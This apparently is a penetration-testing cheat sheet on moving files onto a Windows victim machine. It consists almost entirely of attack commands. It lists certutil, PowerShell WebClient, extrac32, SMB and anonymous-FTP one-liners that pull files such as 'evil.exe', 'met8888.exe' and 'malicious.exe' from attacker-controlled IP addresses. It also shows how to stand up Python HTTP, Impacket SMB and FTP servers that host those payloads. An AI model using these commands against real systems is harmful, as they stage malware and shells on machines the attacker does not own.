# Built in windows utility to download file:
### certutil.exe

```
certutil.exe -urlcache -split -f http://10.10.0.101/evil.exe safe.exe
certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
```

### Powershell:
```
(new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\jarrieta\Desktop\met8888.exe')
```


# setup webserver to download malicious file:
run the command in the folder you want hosted. 

## python2:
```
python -m SimpleHTTPServer 8000
```

## python3:
```
python3 -m http.server 8000
```

#### Check:
browse to localhost:8000

#### From Victim Machine:
browse to <Attacker-IP>:8000


# SMB share:
#### setup SMB sharefrom Impacket:
/opt/impacket/examples:
```
python smbserver.py ROPNOP /root/shells
```

#### From Windows:
```
net view \\192.168.1.29
dir \\192.168.1.29\folder
copy \\192.168.1.29\folder\mailicious.exe
```

#### OR:
```
extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt
```

# Setup FTP server:
#### install and start FTP server:
```
apt-get install python-pyftpdlib
python -m pyftpdlib -p 21
```

#### Download file from Windows:
```
C:\>ftp 192.168.1.29
username: anonymous
password: whatever
ftp> binary
ftp> get malicious.exe
ftp> bye
```
